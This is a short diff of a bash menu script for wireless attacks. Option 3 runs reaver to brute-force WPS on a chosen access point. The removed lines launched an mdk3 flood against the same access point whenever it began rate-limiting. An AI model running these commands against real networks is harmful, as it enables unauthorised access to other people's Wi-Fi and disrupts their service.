@@ -180,11 +180,7 @@ menu
 ;;
 	3)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ~TmpReaverOutput.txt 
-DETECT_RATE_LIMITING= tail -n 1 ~TmpReaverOutput.txt
-while [ "$DETECT_RATE_LIMITING" = "[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking" ]; do
-gnome-terminal  --geometry=1x2 --title='Flood Attack in Progess' -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250"
-done
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
